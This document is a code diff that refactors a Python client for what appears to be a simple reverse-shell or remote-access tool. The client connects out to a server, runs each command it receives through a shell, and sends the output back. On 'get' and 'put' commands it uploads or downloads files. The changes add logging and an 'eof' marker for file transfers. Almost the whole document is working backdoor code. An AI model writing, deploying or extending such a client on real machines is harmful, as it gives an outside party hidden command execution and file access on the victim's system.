@@ -10,52 +10,37 @@ import os
 import sys
 import subprocess
 import getpass
+import logging
 
 SERVER = 'localhost'
 PORT = 1803
 BUFFER = 1024
 CODING = "utf-8"
 END_MSG = 'exit'
-GET_FILE_TRIGER = b'trans'
-PUT_FILE_TRIGER = b'put'
+GET_FILE_TRIGER = 'get'
+PUT_FILE_TRIGER = 'put'
+FORMAT = "%(asctime)s - %(message)s"
+DATE_FMT = "%d/%m/%Y %I:%M:%S"
+LOG_LEVEL = 'INFO'
+
+logging.basicConfig(filename="client.log", format=FORMAT, datefmt=DATE_FMT, level=LOG_LEVEL)
 
 
-def command_executor(command):
-    '''
-    recive a command execute it and return the STDOUT
-    :return output: str
-    '''
-    try:
-        if command == b"whoami":
-            print(getpass.getuser())
-            return getpass.getuser()
-        if command[:2].decode(CODING) == 'cd':
-            os.chdir(command[3:].decode(CODING))
-        if len(command) > 0:
-            output = subprocess.Popen(command[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
-                                      stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-            output = (output.stdout.read() + output.stderr.read()).decode(CODING)
-        return f"{os.getcwd()}$ {output}"
-
-    except IOError as exp:
-        return "not allowed: {} ".format(exp)
-
-
-def get_file(connection):
+def put_file(connection):
     '''get file from the server'''
     file_path = connection.recv(BUFFER)
     try:
         with open(file_path, 'wb') as file:
             while True:
                 data = connection.recv(BUFFER)
-                if not data:
+                if data == 'eof'.encode(CODING):
                     break
                 file.write(data)
-    except:
-        print("LOGGGGGG")
+    except Exception as exp:
+        logging.error(exp)
 
 
-def put_file(connection):
+def get_file(connection):
     '''upload file to the server'''
     try:
         file_path = connection.recv(BUFFER)
@@ -64,22 +49,25 @@ def put_file(connection):
             while data:
                 connection.send(data)
                 data = file.read(BUFFER)
-    except:
-        print("LOG")
+        connection.send(b'eof')
+    except Exception as exp:
+        logging.error(exp)
 
 
 def server_connection(remote_ip, port):
     '''
     connect to the server
     '''
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    global sock
+    sock = socket.socket()
     server_address = (remote_ip, port)
     print('connecting to {} port {}'.format(*server_address))
+    logging.info('connecting to {} port {}'.format(*server_address))
     try:
         sock.connect(server_address)
         return sock
-    except ConnectionError as con_e:
-        print("a connection error: {}".format(con_e))
+    except ConnectionError as exp:
+        logging.error(exp)
 
 
 def command_receiver(sock):
@@ -88,35 +76,33 @@ def command_receiver(sock):
     :param sock:
     :return:
     '''
-    while True:
-        try:
-            data = sock.recv(BUFFER).decode(CODING)
-            print(data)
-            if data == END_MSG:
-                sock.send(END_MSG.encode(CODING))
-                sock.close()
-                sys.exit(0)
-            elif data == GET_FILE_TRIGER:
-                get_file(sock)
-            elif data == PUT_FILE_TRIGER:
-                put_file(sock)
-            else:
-                command_output = command_executor(data)
-                data_sender(sock, command_output)
-        except ConnectionResetError as reset:
-            print('the server is offline')
-
-
-def data_sender(sock, data):
-    '''
-    send data to the server
-    :param sock: socket
-    :param data: command output
-    '''
     try:
-        sock.send(data.encode(CODING))
-    except ConnectionError as con_e:
-        print("a connection error: {}".format(con_e))
+        while True:
+            data = sock.recv(BUFFER)
+            if len(data) > 0:
+                data = data.decode(CODING)
+                logging.info(data)
+                if data == END_MSG:
+                    sock.send(END_MSG.encode(CODING))
+                    sock.close()
+                    sys.exit(0)
+                elif data == "whoami":
+                    sock.send((getpass.getuser()).encode(CODING))
+                elif data == GET_FILE_TRIGER:
+                    get_file(sock)
+                elif data == PUT_FILE_TRIGER:
+                    put_file(sock)
+                elif data[:2] == 'cd':
+                    os.chdir(data[3:])
+                elif len(data) > 1:
+                    output = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE,
+                                              stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+                    output = (output.stdout.read() + output.stderr.read()).decode(CODING)
+                    logging.info(f"out: {output}")
+                    sock.send(f"{os.getcwd()}$ {output}".encode(CODING))
+
+    except ConnectionResetError as reset:
+        logging.error(reset)
 
 
 def main():
